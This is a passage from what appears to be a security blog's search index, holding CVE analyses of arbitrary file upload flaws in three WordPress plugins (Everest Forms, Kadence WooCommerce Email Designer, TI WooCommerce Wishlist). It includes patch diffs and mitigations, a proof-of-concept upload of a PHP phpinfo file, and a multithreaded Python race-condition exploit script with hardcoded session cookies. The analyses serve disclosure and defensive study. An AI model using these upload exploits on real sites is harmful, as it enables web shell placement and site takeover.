","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause This vulnerability is caused by insufficient validation of file types and file paths in the format method of the EVF_Form_Fields_Upload class. Even when a file is of an invalid type, the upload flow can continue; by modifying parts of the submitted data/communication, server-side validation can be bypassed. class-evf-form-fields-upload.php - v3.0.9.4 public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } ... // upload file handler } The wp_check_filetype_and_ext() function will return empty values for $ext and $type if the uploaded file is invalid (not in WordPress’s whitelist of allowed types: https://developer.wordpress.org/reference/functions/wp_get_mime_types/). After lines 8-9 run, there is no mechanism to stop execution, so the upload logic continues. The patch fixes this by calling wp_die(): class-evf-form-fields-upload.php - v3.0.9.5 public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); wp_die( 'File type is not allowed' ); } ... // upload file handler } ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis class-evf-form-fields-upload.php - v3.0.9.4 public function format( $field_id, $field_submit, $form_data, $meta_key ) { // Setup class properties to reuse everywhere. $this-\u003eform_data = (array) $form_data; $this-\u003eform_id = absint( $this-\u003eform_data['id'] ); $this-\u003efield_id = $field_id; $this-\u003efield_data = $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]; $field_label = ! empty( $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] ) ? $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] : ''; $input_name = sprintf( 'everest_forms_%d_%s', $this-\u003eform_id, $this-\u003efield_id ); // Make sure json_decode() doesn't fail on newer PHP. try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } // Make sure we process only submitted files with the expected structure and keys. $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); if ( empty( $files ) ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $data = array(); foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } // Allow third-party integrations. if ( has_filter( 'everest_forms_integration_uploads' ) ) { $file = apply_filters( 'everest_forms_integration_uploads', $file, $this-\u003eform_data ); } if ( $this-\u003eis_media_integrated() ) { $file['path'] = $file['tmp_path']; $file = $this-\u003egenerate_file_attachment( $file ); } elseif ( ! isset( $file['external'] ) \u0026\u0026 file_exists( $file['tmp_path'] ) ) { $this-\u003ecreate_dir( dirname( $file['path'] ) ); @rename( $file['tmp_path'] , $file['path'] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged $this-\u003eset_file_fs_permissions( $file['path'] ); } $data[] = $this-\u003egenerate_file_data( $file ); } ... } This plugin is intended to create form templates and use them in posts/pages. Because the vulnerability concerns file upload, we create a form with a File Upload field and embed it into a post. Create a form with a **File Upload** field Upload any file and intercept it with BurpSuite (uploads are allowed for anonymous users when accessing the post/page that contains the form). Intercept file upload request with BurpSuite Set a breakpoint at the format() method and observe. $input_name in debugger From debugging, $input_name maps to the array containing JSON data fields file and name. The data is JSON-decoded and assigned to $raw_files: try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $raw_files in debugger $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); This filter returns the data assigned to $files, ensuring only submitted files with the expected structure and keys are processed; otherwise it returns empty. $files in debugger Iterating the $files array, the plugin calls generate_file_info() to create temporary information for each file, then checks the file type using wp_check_filetype_and_ext(). foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"] B --\u003e C[\"WP hook triggered - listen_task()\"] C --\u003e D[\"do_task() calls do_action() with field type\"] D --\u003e E[\"everest_forms_process_format_file-upload calls format()\"] E --\u003e F[\"generate_file_info() creates tmp_path, name, path\"] E --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"] G --\u003e H{\"File type check result\"} H --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"] H --\u003e|Invalid| J[\"Set error but continue execution\"] J --\u003e I I --\u003e K[\"File accessible in uploads → potential executable upload\"] graph TD A[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"] B --\u003e C[\"WP hook triggered - listen_task()\"] C --\u003e D[\"do_task() calls do_action() with field type\"] D --\u003e E[\"everest_forms_process_format_file-upload calls format()\"] E --\u003e F[\"generate_file_info() creates tmp_path, name, path\"] E --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"] G --\u003e H{\"File type check result\"} H --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"] H --\u003e|Invalid| J[\"Set error but continue execution\"] J --\u003e I I --\u003e K[\"File accessible in uploads → potential executable upload\"] graph TD A[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"] B --\u003e C[\"WP hook triggered - listen_task()\"] C --\u003e D[\"do_task() calls do_action() with field type\"] D --\u003e E[\"everest_forms_process_format_file-upload calls format()\"] E --\u003e F[\"generate_file_info() creates tmp_path, name, path\"] E --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"] G --\u003e H{\"File type check result\"} H --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"] H --\u003e|Invalid| J[\"Set error but continue execution\"] J --\u003e I I --\u003e K[\"File accessible in uploads → potential executable upload\"] graph TD A[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"] B --\u003e C[\"WP hook triggered - listen_task()\"] C --\u003e D[\"do_task() calls do_action() with field type\"] D --\u003e E[\"everest_forms_process_format_file-upload calls format()\"] E --\u003e F[\"generate_file_info() creates tmp_path, name, path\"] E --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"] G --\u003e H{\"File type check result\"} H --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"] H --\u003e|Invalid| J[\"Set error but continue execution\"] J --\u003e I I --\u003e K[\"File accessible in uploads → potential executable upload\"] ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a .txt file that contains PHP code: TEXT \u003c?php phpinfo();?\u003e Enable Burp Intercept and capture the file upload request. Modify the name field in the intercepted request to use the .php extension and forward the request. File uploaded successfully Access the uploaded file. phpinfo() from uploaded file ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in EVF_Form_Fields_Upload::format() allows arbitrary file upload, read, and deletion due to improper file type and path validation. Although the plugin logs an error when encountering an invalid file, the execution flow does not halt and still calls rename() to move the file into a public directory — enabling the placement of executable code on the server (RCE), disclosure of sensitive data, or site takeover. The patch (\u003e= 3.0.9.5) fixes this by stopping execution when an invalid file is detected; unpatched sites remain at high risk. ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Insufficient validation of file types/extensions can lead to executable file uploads. Detecting an invalid file but not stopping the execution flow allows attackers to bypass checks. Validation is meaningless unless accompanied by a blocking action (stop/exit/wp_die) prior to filesystem operations. Validate file content (MIME/content) in addition to name/extension provided by the client. Prevent PHP execution in the uploads directory and use safe upload APIs (e.g., wp_handle_upload()). ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress Everest Forms Plugin \u003c= 3.0.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Kadence WooCommerce Email Designer Plugin.","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in Ben Ritner - Kadence WP Kadence WooCommerce Email Designer allows uploading a web shell to the web server. This issue affects Kadence WooCommerce Email Designer from an unspecified version up to 1.5.14. CVE ID: CVE-2025-39557 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.5.14 Patched Versions: 1.5.15 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Kadence WooCommerce Email Designer Plugin ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Kadence WooCommerce Email Designer: 1.5.14 (vulnerable) and 1.5.15 (patched). Diff tool - Meld or any diff tool to compare versions. WooCommerce Plugin ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff class-kadence-woomail-import-export.php - v1.5.14 static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } In the vulnerable version, the import_woomail() function calls wp_handle_upload() to upload files to WordPress’s uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug However, the option test_type =\u003e false causes WordPress to skip MIME type checking against the whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. class-kadence-woomail-import-export.php - v1.5.15 static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e true, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } The patch changes 'test_type' =\u003e true, enabling MIME checks against the whitelist and preventing dangerous uploads like .php web shells. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code class-kadence-woomail-import-export.php - v1.5.14 static private function import_woomail( $wp_customize ) { // Make sure we have a valid nonce. if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } // Make sure WordPress upload support is loaded. if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } // Load the export/import option class. require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php'; // Setup global vars. global $wp_customize; global $kt_woomail_import_error; // Setup internal vars. $kt_woomail_import_error = false; $template = 'kadence-woomail-designer'; $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); // Make sure we have an uploaded file. if ( isset( $file['error'] ) ) { $kt_woomail_import_error = $file['error']; return; } if ( ! file_exists( $file['file'] ) ) { $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' ); return; } // Get the upload data. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); // Check for support of older export files. Will remove later. if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } // Remove the uploaded file. unlink( $file['file'] ); ... exit; } The import_woomail() function handles uploads and imports for the Kadence WooCommerce Email Designer plugin: Verify nonce to ensure request validity (prevent CSRF): if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } Perform the upload via wp_handle_upload(): $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); As analyzed above, this implementation accepts .php due to disabled MIME checks. Read uploaded file content and attempt to parse as JSON: $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); If not valid JSON → attempt base64_decode() then unserialize(): if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } Delete the uploaded file from the server: unlink( $file['file'] ); We need to pay attention to the following: graph LR; A[Upload File] --\u003e B[Read File \u0026 Decode JSON] B --\u003e C{IF JSON} C --\u003e|True| D[\"unserialize()\"] D --\u003e E[\"unlink()\"] graph LR; A[Upload File] --\u003e B[Read File \u0026 Decode JSON] B --\u003e C{IF JSON} C --\u003e|True| D[\"unserialize()\"] D --\u003e E[\"unlink()\"] graph LR; A[Upload File] --\u003e B[Read File \u0026 Decode JSON] B --\u003e C{IF JSON} C --\u003e|True| D[\"unserialize()\"] D --\u003e E[\"unlink()\"] graph LR; A[Upload File] --\u003e B[Read File \u0026 Decode JSON] B --\u003e C{IF JSON} C --\u003e|True| D[\"unserialize()\"] D --\u003e E[\"unlink()\"] The file is removed immediately after upload, so it cannot be accessed normally. Leverage the time window between Upload File and unlink() to call the uploaded file within that period to execute a web shell. This uses a File Upload + Race Condition technique. class-kadence-woomail-import-export.php - v1.5.14 static public function import_export_requests( $wp_customize ) { // Check if user is allowed to change values. if ( ! Kadence_Woomail_Designer::is_admin() ) { exit; } if ( isset( $_REQUEST['kt-woomail-export'","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"] B --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"] C --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"] D --\u003e E[\"json_decode($raw) — attempt parse as JSON\"] E --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"] F --\u003e G[\"Process/import template data\"] G --\u003e H[\"unlink($file['file']) — delete uploaded file\"] H --\u003e I[\"File removed from filesystem\"] graph TD A[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"] B --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"] C --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"] D --\u003e E[\"json_decode($raw) — attempt parse as JSON\"] E --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"] F --\u003e G[\"Process/import template data\"] G --\u003e H[\"unlink($file['file']) — delete uploaded file\"] H --\u003e I[\"File removed from filesystem\"] graph TD A[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"] B --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"] C --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"] D --\u003e E[\"json_decode($raw) — attempt parse as JSON\"] E --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"] F --\u003e G[\"Process/import template data\"] G --\u003e H[\"unlink($file['file']) — delete uploaded file\"] H --\u003e I[\"File removed from filesystem\"] graph TD A[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"] B --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"] C --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"] D --\u003e E[\"json_decode($raw) — attempt parse as JSON\"] E --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"] F --\u003e G[\"Process/import template data\"] G --\u003e H[\"unlink($file['file']) — delete uploaded file\"] H --\u003e I[\"File removed from filesystem\"] ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a script that runs parallel upload and checks Python Script import requests from concurrent.futures import ThreadPoolExecutor from datetime import datetime import threading proxies = { \"http\": \"127.0.0.1:8080\", \"https\": \"127.0.0.1:8080\" } headers = { \"User-Agent\": \"curl/8.14.1\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Cookie\": ( \"wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; \" \"wordpress_test_cookie=WP%20Cookie%20check; \" \"wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; \" \"mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D\" ) } php_payload = '\u003c?php phpinfo(); ?\u003e' upload_url = \"http://localhost/wp-admin/customize.php?kt-woomail-customize=1\" check_url = \"http://localhost/wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/\u003cfilename\u003e.php\" UPLOAD_THREADS = 40 CHECK_THREADS = 40 upload_success_detected = threading.Event() def upload_worker(_): session = requests.Session() session.headers.update(headers) session.verify = False files = { 'kt-woomail-import': (None, '5afa8d8781'), 'kadence-woomail-import-file': ('\u003cfilename\u003e.php', php_payload, 'application/octet-stream') } while not upload_success_detected.is_set(): try: response = session.post( upload_url, files=files, timeout=10 ) ts = datetime.now().strftime(\"%H:%M:%S\") if 200 \u003c= response.status_code \u003c 300: print(f\"\\033[92m[{ts}] [UPLOAD] Sent | 200 OK\\033[0m\") else: print(f\"\\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\\033[0m\") except Exception as e: print(f\"\\033[91m[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD ERROR] {e}\\033[0m\") def check_worker(_): session = requests.Session() session.proxies.update(proxies) session.verify = False while not upload_success_detected.is_set(): try: response = session.get(check_url, timeout=8) ts = datetime.now().strftime(\"%H:%M:%S\") if response.status_code == 200 and len(response.text) \u003e 0: print(f\"\\n\\033[101m[{ts}] [RCE DETECTED!] File uploaded \u0026 executed!\\033[0m\") upload_success_detected.set() break else: print(f\"[{ts}] [CHECK] {response.status_code} | Not found yet...\") except Exception as e: print(f\"[{datetime.now().strftime('%H:%M:%S')}] [CHECK ERROR] {e}\") if __name__ == \"__main__\": print(\"\\033[96m\" + \"=\"*60) print(\" WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT\") print(\" Upload + Auto Check Parallel Threads\") print(\"=\"*60 + \"\\033[0m\") print(f\"[*] Upload URL : {upload_url}\") print(f\"[*] Check URL : {check_url}\") print(f\"[*] Threads : {UPLOAD_THREADS} (upload) + {CHECK_THREADS} (check)\") print(\"[*] Press Ctrl+C to stop\\n\") try: with ThreadPoolExecutor(max_workers=UPLOAD_THREADS + CHECK_THREADS) as executor: upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)] check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)] upload_success_detected.wait() except KeyboardInterrupt: print(\"\\n\\033[93m[!] Stopped by user.\\033[0m\") finally: upload_success_detected.set() print(\"\\033[91m[!] All threads terminated.\\033[0m\") Specifically: The script performs concurrent upload and checks; it stops only when the check returns (status=200). The check function goes through a BurpSuite proxy to observe responses and filter by status code. Add cookies and nonce to the script Open BurpSuite to monitor requests/responses from the script. Run the script python3 -m venv venv source venv/bin/active pip install requests python script.py Terminal Output: Result on terminal BurpSuite Output: Result on BurpSuite ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability occurs because the plugin skips MIME checking (test_type =\u003e false) during upload, allowing .php files to be uploaded. The file is deleted immediately after processing but exists briefly enough to be exploited via a race condition. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Root cause: missing MIME checks + storing temporary files in a public directory. Patched in 1.5.15 (test_type =\u003e true). Mitigation: always validate MIME types, avoid storing executable files in public directories. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Upload via Race Condition Arbitrary File Upload WordPress Kadence WooCommerce Email Designer Plugin \u003c= 1.5.14 is vulnerable to Arbitrary File Upload ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The “Unrestricted Upload of File with Dangerous Type” vulnerability in TemplateInvaders TI WooCommerce Wishlist allows uploading a Web Shell to the web server. This issue affects TI WooCommerce Wishlist: from n/a to before 2.10.0. CVE ID: CVE-2025-47577 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.9.2 Patched Versions: 2.10.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress TI WooCommerce Wishlist Plugin ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - TI WooCommerce Wishlist: 2.9.2 (vulnerable) and 2.10.0 (patched). Diff tool - Meld or any diff tool to check and compare differences between versions. WooCommerce WC Fields Factory ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff wc-fields-factory.php - v2.9.2 function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, 'test_type' =\u003e false, ] ); return $upload; } In the vulnerable version, the function tinvwl_upload_file_wc_fields_factory() calls wp_handle_upload() to upload files into WordPress’s official uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug However, the option test_type =\u003e false causes WordPress to skip MIME Type checking against its allowed whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. wc-fields-factory.php - v2.10.0 function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, ] ); return $upload; } The patch removes the 'test_type' =\u003e false option, so by default 'test_type' 